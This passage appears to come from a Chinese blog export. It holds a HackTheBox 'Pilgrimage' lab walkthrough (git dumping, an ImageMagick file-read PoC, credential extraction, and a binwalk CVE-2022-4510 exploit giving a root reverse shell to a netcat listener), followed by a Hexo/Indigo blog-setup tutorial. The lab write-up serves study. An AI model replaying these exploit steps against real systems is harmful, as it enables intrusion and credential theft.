fingerprint:\nOS:SCAN(V=7.93%E=4%D=6/29%OT=22%CT=1%CU=41157%PV=Y%DS=2%DC=T%G=Y%TM=649C5D6\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 256/tcp)\nHOP RTT       ADDRESS\n1   441.45 ms 10.10.16.1\n2   474.83 ms pilgrimage.htb (10.10.11.219)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.36 seconds\n```\n\n### Http\n\n![image-20230629000730338](Hackthebox-Pilgrimage/image-20230629000730338.png)\n\nhttp 访问会跳转到 `pilgrimage.htb` ，去添加个 hosts 解析\n\n```\necho 10.10.11.219 pilgrimage.htb >> /etc/hosts\n```\n\n![image-20230629001352439](Hackthebox-Pilgrimage/image-20230629001352439.png)\n\n这是个压缩图片大小的网页\n\n暂时没什么线索，尝试去利用 `.git` 文件试试\n\n## 漏洞利用\n\n### Git-Dumper\n\n```\napt install git-dumper\n```\n\n安装 git-dumper\n\n```\n┌──(root㉿kali)-[~/Desktop/Pilgrimage]\n└─# git-dumper http://pilgrimage.htb/.git/ .\n```\n\n去下载 .git 的内容\n\n```\n┌──(root㉿kali)-[~/Desktop/Pilgrimage/repo]\n└─# ls -la\n总计 26972\ndrwxr-xr-x 5 root root     4096  6月29日 00:37 .\ndrwxr-xr-x 3 root root     4096  6月29日 00:36 ..\ndrwxr-xr-x 6 root root     4096  6月29日 00:37 assets\n-rwxr-xr-x 1 root root     5538  6月29日 00:37 dashboard.php\ndrwxr-xr-x 7 root root     4096  6月29日 00:37 .git\n-rwxr-xr-x 1 root root     9250  6月29日 00:37 index.php\n-rwxr-xr-x 1 root root     6822  6月29日 00:37 login.php\n-rwxr-xr-x 1 root root       98  6月29日 00:37 logout.php\n-rwxr-xr-x 1 root root 27555008  6月29日 00:37 magick\n-rwxr-xr-x 1 root root     6836  6月29日 00:37 register.php\ndrwxr-xr-x 4 root root     4096  6月29日 00:37 vendor\n```\n\n似乎是完整的网站源码\n\n```\n  $db = new PDO('sqlite:/var/db/pilgrimage');\n  $stmt = $db->prepare(\"SELECT * FROM users WHERE username = ? and password = ?\");\n  $stmt->execute(array($username,$password));\n```\n\n在 `login.php` 中发现了有连接数据库，但是我们必须得从服务器读取文件才行\n\n```\n┌──(root㉿kali)-[~/Desktop/Pilgrimage/repo]\n└─# ./magick\nError: Invalid argument or not enough arguments\n\nUsage: magick tool [ {option} | {image} ... ] {output_image}\nUsage: magick [ {option} | {image} ... ] {output_image}\n       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]\n       magick -help | -version | -usage | -list {option}\n\n┌──(root㉿kali)-[~/Desktop/Pilgrimage/repo]\n└─# ./magick -version\nVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org\nCopyright: (C) 1999 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5) \nDelegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (7.5)\n```\n\n这里有一个 `ImageMagick 7.1.0-49`\n\n![image-20230629003948882](Hackthebox-Pilgrimage/image-20230629003948882.png)\n\n搜索到不少漏洞，挨个尝试一下\n\n### ImageMagick\n\n> https://github.com/Sybil-Scan/imagemagick-lfi-poc\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc       \n正克隆到 'imagemagick-lfi-poc'...\nremote: Enumerating objects: 7, done.\nremote: Counting objects: 100% (7/7), done.\nremote: Compressing objects: 100% (6/6), done.\nremote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0\n接收对象中: 100% (7/7), 完成.\n处理 delta 中: 100% (1/1), 完成.\n```\n\n将工具下载下来，然后去读取 `/var/db/pilgrimage`\n\n```\n┌──(root㉿kali)-[~/Desktop/imagemagick-lfi-poc]\n└─# python3 generate.py -f \"/var/db/pilgrimage\" -o output.jpg\n\n   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>\n   [>] Generating Blank PNG\n   [>] Blank PNG generated\n   [>] Placing Payload to read /var/db/pilgrimage\n   [>] PoC PNG generated > output.jpg\n```\n\n然后现在去上传文件\n\n![image-20230629004313184](Hackthebox-Pilgrimage/image-20230629004313184.png)\n\n然后下载\n\n```\n┌──(root㉿kali)-[~/Desktop/imagemagick-lfi-poc]\n└─# wget http://pilgrimage.htb/shrunk/649c6319eab12.png                        \n--2023-06-29 00:43:57--  http://pilgrimage.htb/shrunk/649c6319eab12.png\n正在解析主机 pilgrimage.htb (pilgrimage.htb)... 10.10.11.219\n正在连接 pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：1645 (1.6K) [image/png]\n正在保存至: “649c6319eab12.png”\n\n649c6319eab12.png                                    100%[======================>]   1.61K  --.-KB/s  用时 0.002s  \n\n2023-06-29 00:43:58 (863 KB/s) - 已保存 “649c6319eab12.png” [1645/1645])\n```\n\n接着使用 exiftool 提取拉取的信息\n\n```\nexiftool 649c6319eab12.png -b\n```\n\n然后去 CyberChef 将十六进制转换为可读的原始文件\n\n> https://gchq.github.io/CyberChef/\n\n![image-20230629010827427](Hackthebox-Pilgrimage/image-20230629010827427.png)\n\n然后保存为 db.sqlite\n\n接着使用 DB Browser for SQLite 打开 db.sqlite\n\n![image-20230629010915864](Hackthebox-Pilgrimage/image-20230629010915864.png)\n\n得到了账号密码\n\n```\nusername = emily\npassword = abigchonkyboi123\n```\n\n去登录 ssh\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh emily@10.10.11.219\nemily@10.10.11.219's password: \nLinux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Jun 29 02:55:58 2023 from 10.10.16.48\nemily@pilgrimage:~$ whoami&&id\nemily\nuid=1000(emily) gid=1000(emily) groups=1000(emily)\n```\n\n成功拿到 user 权限\n\n```\nemily@pilgrimage:~$ cat user.txt \n0fcf6dc2ba19bc3ed1c52591b3275b71\n```\n\n成功拿到 user 权限的 flag 文件\n\n## 权限提升\n\n![image-20230629011303333](Hackthebox-Pilgrimage/image-20230629011303333.png)\n\n运行 pspy 发现定时运行 /usr/sbin/malwarescan.sh 文件\n\n```\nemily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh\n#!/bin/bash\n\nblacklist=(\"Executable script\" \"Microsoft executable\")\n\n/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do\n        filename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')\"\n        binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\"\n        for banned in \"${blacklist[@]}\"; do\n                if [[ \"$binout\" == *\"$banned\"* ]]; then\n                        /usr/bin/rm \"$filename\"\n                        break\n                fi\n        done\ndone\n```\n\n查看代码，发现是对 shrunk 目录下的文件运行 binwalk 后进行检测，满足条件则删除\n\n```\nemily@pilgrimage:~$ /usr/local/bin/binwalk\n\nBinwalk v2.3.2\nCraig Heffner, ReFirmLabs\nhttps://github.com/ReFirmLabs/binwalk\n```\n\nbinwalk 2.3.2 版本发现是存在漏洞的\n\n![image-20230629011621923](Hackthebox-Pilgrimage/image-20230629011621923.png)\n\n> https://www.exploit-db.com/exploits/51249\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 51249.py                                \n\n################################################\n------------------CVE-2022-4510----------------\n################################################\n--------Binwalk Remote Command Execution--------\n------Binwalk 2.1.2b through 2.3.2 included-----\n------------------------------------------------\n################################################\n----------Exploit by: Etienne Lacoche-----------\n---------Contact Twitter: @electr0sm0g----------\n------------------Discovered by:----------------\n---------Q. Kaiser, ONEKEY Research Lab---------\n---------Exploit tested on debian 11------------\n################################################\n\nusage: 51249.py [-h] file ip port\n51249.py: error: the following arguments are required: file, ip, port\n```\n\n首先按照 exp 的提示先生成 exploit\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 51249.py Pilgrimage.png 10.10.16.48 4444\n\n################################################\n------------------CVE-2022-4510----------------\n################################################\n--------Binwalk Remote Command Execution--------\n------Binwalk 2.1.2b through 2.3.2 included-----\n------------------------------------------------\n################################################\n----------Exploit by: Etienne Lacoche-----------\n---------Contact Twitter: @electr0sm0g----------\n------------------Discovered by:----------------\n---------Q. Kaiser, ONEKEY Research Lab---------\n---------Exploit tested on debian 11------------\n################################################\n\n\nYou can now rename and share binwalk_exploit and start your local netcat listener.\n```\n\n然后使用 nc 监听一个端口\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\n```\n\n```\nemily@pilgrimage:~$ wget http://10.10.16.48/binwalk_exploit.png\n--2023-06-29 03:39:53--  http://10.10.16.48/binwalk_exploit.png\nConnecting to 10.10.16.48:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 308713 (301K) [image/png]\nSaving to: ‘binwalk_exploit.png’\n\nbinwalk_exploit.png                                  100%[==============================================>] 301.48K  99.2KB/s    in 3.0s    \n\n2023-06-29 03:39:57 (99.2 KB/s) - ‘binwalk_exploit.png’ saved [308713/308713]\n\nemily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/\n```\n\n进入目录然后下载我们生成的 exploit 然后拷贝到 /var/www/pilgrimage.htb/shrunk/，然后稍等一会儿\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.16.48] from (UNKNOWN) [10.10.11.219] 54062\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功提权到 root 权限\n\n```\ncat /root/root.txt\n9d3b3469da6c33136f90cb3e7fc17964\n```\n\n成功拿到 root 权限的 flag 文件\n\n![image-20230629014230927](Hackthebox-Pilgrimage/image-20230629014230927.png)\n","tags":["Hackthebox"]},{"title":"Hexo+GitHub+Indigo 主题搭建博客踩坑日记","url":"/2023/06/13/学习记录/Hexo-GitHub-Indigo主题搭建博客踩坑日记/","content":"\n# 前言\n\n平时没有什么做记录的习惯，但这习惯不太好，所以搭建了个博客来改掉这个不好的习惯。\n\n在搭建博客的时候，我做了比较多的选择，先说说我选择每个不同的 cms 的取舍以及它们的优缺点。\n\n## Wordpress\n\nWoredpress 其实是我优先考虑的 cms，但有一个问题，首先是服务器需要维护，其次呢毕竟我也是搞安全的是吧，确实存在被攻击的风险，所以这个方案被我放弃了。\n\n## html 静态文件\n\n其次我考虑的是 html 静态文件，但相对的首先也是需要维护服务器，也是一笔费用啊，众所周知我这种穷鬼肯定是舍不得出这个钱的是吧？而且 html 静态文件每次更新确实相对是比较麻烦了，所以这个方案也被我放弃了。\n\n## Notion 等笔记工具\n\n我个人对笔记工具的使用度是相对比较高的，这里我用过的有 Notion、印象笔记、有道笔记、为知笔记、OneNote、语雀等，我先讲讲各自的优缺点和使用感受吧\n\n1. Notion\n   - 优点：我认为 Notion 确实可以称得上有史以来最强大的笔记软件，基于面向对象的设计思路，页面嵌套没有限制，使用空间没有限制，大多数笔记软件付费的功能在 Notion 上都可以免费使用。Notion 的亮点还在于其借助数据库表格的支持，可以衍生出很多不同的玩法。\n   - 缺点：上手难度较高，但我认为这不是软件的缺点，而是使用者的缺点。服务器在境外，始终对国内还是没有想象中的那么友好，且原生环境是不支持中文的，但是这一点可以借助有猴脚本进行中文界面翻译。但让我最无法接受的一点是数据没拿在自己手里，对于我这种仓鼠用户来说心里是没有底的，就怕有一天手里的数据就没了，毕竟我有过百度网盘直接清空我整个网盘的经历，丢失了很多的数据，所以这一点在我看来是无法接受的。\n   - 使用体验：非常棒的笔记软件，支持度很好，也让我找到了很多其他笔记软件无法带给我的玩法，甚至已经超越了笔记软件。结合 Siri 和快捷指令已经替代了我手机里的记账工具、健康管理工具、备忘录等很多 APP，都已经自己通过 Notion 的数据库表格功能实现了定制化。\n2. 印象笔记\n   - 优点：使用简单、风格协调设计合理、强大的搜索功能、精致的书签插件，结合插件可以完美保存网上看到的文章，这是让人很心动的功能。\n   - 缺点：目录层次太浅，无法满足深层次使用。国内版和国外版差别过大，我不太喜欢这种把客户分层的感觉，就比如一个功能，大家都没有那我可以接受，但别人可以用我不能用我就无法接受这种情况。免费版支持的设备上限太少，我个人的使用环境常用的电脑不止一台，再加上 iPad 和手机，无法达成一个比较好的协调，当然这是我个人的问题，也是我不愿意在这类产品上付费，这不是软件的问题。\n   - 使用体验：相对比较不错，但仅是为了支持更多设备而让我付费，这么一点功能无法让我付费。我认为一款产品至少得解决我现有无法解决的情况，才值得我付费，而且还得是同类产品里相对比较优秀的产品才行。\n3. 有道笔记\n   - 优点：丰富的功能点，较大的免费使用空间，足够大部分人的日常使用了。支持目录无限嵌套、支持协同表格、脑图、模板、Markdown、网页剪辑、截图、笔记加密、翻译等一系列非常不错的功能。满足大部分人的使用场景。\n   - 缺点：我自己使用，用不到协同办公，所以相对来说对我没有吸引力。整体设计、编辑器设计有所欠缺，基础体验相对不是很好，界面对我来说优点过于“丑陋”，是我比较无法接受的。\n   - 使用体验：功能不错，但界面丑陋我是真的无法接受，不过支持多设备这一点是一个比较不错的优点。\n4. 为知笔记\n   - 优点：风格简洁素雅、层次分明，自带学术气质，软件界面、交互方面设计的很精致，是我喜欢的风格。支持无限嵌套，对 Markdown 的支持度比较高，比较友好。并且最大的一个亮点就是可以使用自己的服务器，使用 Docker 搭建好为知笔记的服务器即可。\n   - 缺点：不支持思维导图，自带的脑图功能导出的界面相对比较迷。多设备之间的同步是有点问题的，无法做到很完美的进行同步。\n   - 使用体验：为知笔记如今是我的主力笔记软件，用自己的服务器这一点是最吸引我的点，数据在自己手里才是最放心的。\n5. OneNote\n   - 优点：Windows 10 自带的笔记软件，漂亮、免费，OneNote 的结构与交互风格与一般的笔记软件不一样，界面编辑灵活。\n   - 缺点：毕竟服务器在国外，国内用户使用的话同步速度和连接速度不太稳定，而且毕竟是 2003 年的“大叔”产品，相对来说有一点过时了，无法满足现在的部分需求。\n   - 使用体验：同步真的一言难尽，我是没用多久就放弃了。\n6. 语雀\n   - 优点：主打知识库建设，可以创建个人知识库、协同知识库以及知识小组，可以提供不同的知识库模板，团队协作上确实不错。\n   - 缺点：是它的优点，但也是缺点，就是揉合的功能太多，显得过于杂乱，不是我喜欢的风格。\n   - 使用体验：我个人评价是，这是一款国产化的 Notion，并且适配了团队办公的需求。\n\n## 微信公众号\n\n没错，在体验了那么多以后，我还是选择开了个微信公众号来记录和发布文章。\n\n但是有一个问题，微信公众号每天只能推送一篇文章，而且微信公众号是不支持 Markdown 的，只能通过第三方平台进行转换，但是每次搞图片什么的麻烦死了。\n\n## Hexo\n\n说了这么多，终于回到了我们的主题，那就是：Hexo\n\nHexo 是一款高速、简洁且高效的博客框架。Hexo 使用 Markdown 解析文章，在几秒内即可利用靓丽的主题生成静态网页。并且 Hexo 有大量的插件作为支持，是不可多得的选择。\n\nHexo 其实就实现了我使用 Html 静态文件作为博客的想法，同时新增文档也不麻烦，还方便编辑，再加上我日常使用的笔记也恰好是 Markdown，所以只需要做一个很简单的移植即可把我的文章都移植到 Hexo 搭建的博客上。\n\n# Hexo 搭建博客\n\n## Hexo 环境安装\n\n### Windows\n\n#### 安装 NVM\n\n进入 NVM-Windows 最新发布地址：https://github.com/coreybutler/nvm-windows/releases\n\n选择最新发行版进行下载：\n\n![image-20230520194028396](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194028396.png)\n\n下载的 exe 可执行文件就直接打开，下载的 zip 压缩文件就先解压，然后打开点击安装\n\n注意：NVM 的安装路径下不要有中文\n\n![image-20230520194254234](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194254234.png)\n\nNVM 配置文件地址也不要有中文\n\n![image-20230520194311113](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194311113.png)\n\n安装完成后，在 CMD 或者 Powershell 下输入 NVM，即可看到安装完成：\n\n![image-20230520194403885](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194403885.png)\n\n#### 配置国内源\n\n国内这边连接 NVM 和 Node 源比较慢，我们换成国内源：\n\n```\n# node使用淘宝源\nnode_mirror: http://npm.taobao.org/mirrors/node/ \n# npm使用淘宝源\nnpm_mirror: https://npm.taobao.org/mirrors/npm/\n```\n\n![image-20230520194700530](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194700530.png)\n\n#### 安装 Node\n\n首先输入\n\n```\nnvm list\n```\n\n查看安装的版本，目前是没有安装任何版本的\n\n![image-20230520194812513](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194812513.png)\n\n之后我们安装 v12.21 版本的 node\n\n```\nnvm install 12.21\n```\n\n![image-20230520194903460](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520194903460.png)\n\n然后就安装好了 NVM\n\n```\nnvm use 12.21.0\n```\n\n选择要使用的 node 版本，即可\n\n#### 安装 Git\n\n> https://git-scm.com/download/win\n\n![image-20230520201308301](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520201308301.png)\n\n下载后进行安装\n\n1. 许可声明\n\n   ![image-20230520201703466](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520201703466.png)\n\n   点击 “Next” 下一步\n\n2. 选择安装路径\n\n   ![image-20230520201729238](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230520201729238.png)\n\n   根据自己的需要选择安装路径\n\n3. 选择安装组件\n\n   ![image-20230612232832319](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230612232832319.png)\n\n   1. 默认勾选的选项，建议不要动。默认安装了一些组件 Git Bash、Git GUI 以及 Git LFS 还有桌面快捷方式以及配置文件默认的文本编辑，使用 sh 脚本启动 Git Bash\n   2. 红色框决定在所有控制台窗口中使用 TrueType 字体和是否每天检查 Git 是否有 Windows 更新，按需勾选\n\n4. 选择开始菜单目录\n\n   ![image-20230522090430839](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522090430839.png)\n\n   默认 Git 即可，直接 Next 下一步\n\n5. 选择 Git 文件默认的编辑器\n\n   ![image-20230522090524960](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522090524960.png)\n\n   很少用到，所以默认 Vim 即可，直接点击 Next 下一步\n\n6. 选择 Git 初始化分支的名称\n\n   ![image-20230522090603162](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522090603162.png)\n\n   1. Git 默认的初始化分支名称为 “master”\n   2. 根据自己项目业务重新命名，如：main、trunk 或者自己填写\n   3. 已存在的项目不受影响\n\n7. 选择使用 Git 的方式\n\n   ![image-20230522090830702](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522090830702.png)\n\n   1. 第一个选项，只从 Git Bash 命令行工具使用 Git，也是最谨慎的默认选项\n   2. 第二个选项，从命令行或第三方软件使用 Git\n   3. 第三个选项，在命令提示符中使用 Git 和可选的 Unix 工具\n\n8. 选择 https 传输后端\n\n   ![image-20230522091109914](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522091109914.png)\n\n   让 Git 使用哪个 SSL/TLS 库来进行 HTTPS连接\n\n   1. 第一个选项，使用 OpenSSL 库，服务器 cer 证书将使用 ca 包中 .crtw 文件进行验证通过，默认选这个\n   2. 第二个选项，使用本机 Windows 安全通道库，服务器证书将在 Windows 证书存储中进行验证。这个选项还允许通过 Active Directory 域服务使用公司内部根 CA 证书\n\n9. 配置结束行转换方式\n\n   ![image-20230522092224176](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092224176.png)\n\n   Git 应该如何处理文本文件中的行结尾?\n\n   1. 第一个选项，下拉是转换 Windows 风格，提交转换 为iunix 风格，在 Windows 这是推荐默认的设置。\n   2. 第二个选项，下拉时不改变，提交转换为 iunix 风格。对于跨平台项目，这是 Unix 上的推荐设置。\n   3. 第三个选项，下拉和提交都不进行任何转换，对于跨平台项目(“核心项目”)，不推荐选择此选项。\n\n10. 配置终端模拟器为使用 Git Bash\n\n    ![image-20230522092347417](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092347417.png)\n\n    1. 第一个选项，Git Biash 将使用 MinTTY 作为终端模拟器，它拥有一个可调整大小的窗口，非矩形的选择和 Unicode 字体。Windows 控制台程序(如交互式 Python)必须通过 ‘winpty’ 启动才能在 MinTTY 中工作，默认选择这个更灵活。\n    2. 第二个选项，使用 Windows 的默认控制台（cmd.exe）,它可以在 Win32 控制台程序中工作，如交互式 Python 或 node.js，但有一个非常有限的默认滚动回滚，需要配置为使用 Unicode 字体，以便正确显示非 ascil 字符，在 Windows 10 之前，它的窗口不能自由调整大小，它只允许矩形文本选择\n\n11. 选择 Git 下拉默认行为\n\n    ![image-20230522092538730](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092538730.png)\n\n    1. 第一个选项，默认(快进或合并)。这是 “git pull” 的标准行为:尽可能快进当前分支到一个被捕获的分支，否则创建合并提交。\n    2. 第二个选项，将当前分支改为获取的分支。如果没有要重基的本地提交，这相当于快进。\n    3. 第三个选项，仅仅快进， 快进到获取的分支。如果不可能，就失败。\n\n12. 选择 Git 凭证小助手\n\n    ![image-20230522092633629](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092633629.png)\n\n    Credential helper是帮我们保存凭证（用户密码）他有很多存储模式如：cache，store，manager 和 osxkeychain，默认 wincred，这里根据自己需要选择。\n\n13. 配置额外特性选项\n\n    ![image-20230522092653359](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092653359.png)\n\n    1. 第一个选项，启用文件系统缓存,文件系统数据将被大量读取，并缓存到内存中以用于某些操作(“core。fscache” 设置为 ”true”)。这提供了显著的性能提升。\n    2. 第二个选项，支持符号链接，启用符号链接(需要 SeCreateSymboliclink 权限)。请注意，现有存储库不受此设置的影响。\n\n14. 启用实验配置选项\n\n    ![image-20230522092726985](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092726985.png)\n\n    启用对伪控制台的实验性支持,(新)这允许在Git Bash窗口中运行原生控制台程序，如 Node 或 Python，而不使用 winpty，但它仍然有已知的 bug,一般用不到 可不勾选\n\n    点击 Install 即可安装完毕。\n\n15. 安装完成\n\n    ![image-20230522092820600](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092820600.png)\n\n    Git Bash，是Git配套的一个控制台\n\n16. 启用\n\n    ![image-20230522092842772](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230522092842772.png)\n\n#### 安装 Hexo\n\n在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo\n\n```\nnpm install hexo-cli -g\n```\n\n安装完成后查看版本，如果弹出了版本号就是安装成功了\n\n```\nhexo -v\n```\n\n### Mac/Linux\n\nMac 和 Linux 都可以使用编译安装的方法安装 NVM，但 Mac 用户还是推荐使用 Homebrew 来安装 NVM。\n\n#### 安装 NVM\n\n本教程来自：https://github.com/nvm-sh/nvm\n\n要安装和更新 NVM，可以使用安装脚本 https://github.com/nvm-sh/nvm/blob/v0.39.3/install.sh。可以手动下载脚本或使用 Curl 和 Wget 命令进行下载：\n\n```\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\n```\n\n```\nwget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\n```\n\n运行上述任一命令都会下载脚本并运行它。\n\n该脚本将 nvm 存储库克隆到 `~/.nvm`，并尝试将下面代码段中的源代码行添加到正确的配置文件（`~/.bash_profile`、`~/.zshrc`、`~/.profile`或`~/.bashrc`）\n\n之后到环境配置中追加下述内容：\n\n```\nexport NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\" # This loads nvm\n```\n\n安装完成后，在终端输入 `nvm` 未报错 `command not find` 即为安装成功\n\n#### 配置国内源\n\n在终端输入如下内容进行设置国内源\n\n```\nexport NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/\n```\n\n#### 安装 Node\n\n使用如下命令安装 Node\n\n```\nnvm install 12.21\n```\n\n可以测试一下是否可用\n\n```\nnvm list\nnvm use 12.21\nnode -v\n```\n\n#### 安装 Git\n\n##### Centos\n\n```\nyum install git -y\n```\n\n在 Centos 下可以使用 yum 安装程序\n\n##### Ubuntu\n\n```\napt install git -y\n```\n\n在 Ubuntu 等 Debian 架构下可以使用 apt 安装程序\n\n#### 安装 Hexo\n\n在上面的环境都安装\n\n在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo\n\n```\nnpm install hexo-cli -g\n```\n\n安装完成后查看版本，如果弹出了版本号就是安装成功了\n\n```\nhexo -v\n```\n\n### Mac 专属\n\n#### 安装 NVM\n\n在安装 Homebrew 的情况下，终端输入：\n\n```\nbrew install nvm\n```\n\n即可完成安装\n\n#### 配置国内源\n\n在终端输入如下内容进行设置国内源\n\n```\nexport NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/\n```\n\n#### 安装 Node\n\n使用如下命令安装 Node\n\n```\nnvm install 12.21\n```\n\n可以测试一下是否可用\n\n```\nnvm list\nnvm use 12.21\nnode -v\n```\n\n#### 安装 Git\n\n##### 直接安装\n\n在 Mac 下是会默认安装 Git 的\n\n```\ngit --version\n```\n\n可使用上面的命令查看是否安装，如果已经安装会输出 git 的版本\n\n![d570604a-c09d-4d84-82e0-df78af411f5a](Hexo-GitHub-Indigo主题搭建博客踩坑日记/d570604a-c09d-4d84-82e0-df78af411f5a.png)\n\n如果没有安装的话，会弹出上述窗口进行安装\n\n![c1cb0d85-468f-4928-ba8b-51586e7c6797](Hexo-GitHub-Indigo主题搭建博客踩坑日记/c1cb0d85-468f-4928-ba8b-51586e7c6797.png)\n\n点击同意即可\n\n##### Brew 安装\n\n可以利用 Brew 工具包管理器进行 Git 安装，安装方法我会在另一篇 Mac M1 渗透测试环境搭建的文章中写，我就不在这里赘述了\n\n```\nbrew install git\n```\n\n然后等待安装完成就行\n\n#### 安装 Hexo\n\n在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo\n\n```\nnpm install hexo-cli -g\n```\n\n安装完成后查看版本，如果弹出了版本号就是安装成功了\n\n```\nhexo -v\n```\n\n# Hexo 部署博客\n\n## 博客搭建\n\n创建一个文件夹，进入文件夹后然后使用 hexo 进行初始化\n\n```\nhexo init\n```\n\n然后就创建完成了我们的初始化博客\n\n```\nhexo s\n```\n\n即可在本地部署博客，即可在浏览器中打开\n\n![](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230607094544458.png)\n\n我们来创建第一篇内容\n\n```\nhexo new test1\n```\n\n```\nhexo s\n```\n\n然后再用 hexo g 编译博客\n\n然后使用 hexo s 在本地部署博客\n\n就可以看到我们的第一篇博客\n\n![image-20230607095025249](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230607095025249.png)\n\n## 主题更换\n\n博客搭建好了，接下来需要换一个满意的博客主题\n\n> https://hexo.io/themes/\n\n可以在上面选择喜欢的主题\n\n![](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230612223319147.png)\n\n这里我使用的是 `Indigo`\n\n> https://github.com/yscoder/hexo-theme-indigo\n\n进入到 hexo 目录中的 themes 目录中\n\n```\ngit clone https://github.com/yscoder/hexo-theme-indigo\n```\n\n将主题下载到当前目录下\n\n返回 hexo 的根目录中，打开配置文件 `_config.yml`，去修改内容\n\n```\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: landscape\n```\n\n将第 100 行的 `theme: landscape` 修改为 `hexo-theme-indigo` \n\n### 依赖安装\n\n#### Less\n\n主题默认使用 less 作为 css 预处理工具\n\n```\nnpm install hexo-renderer-less --save\n```\n\n#### Feed\n\n用于生成 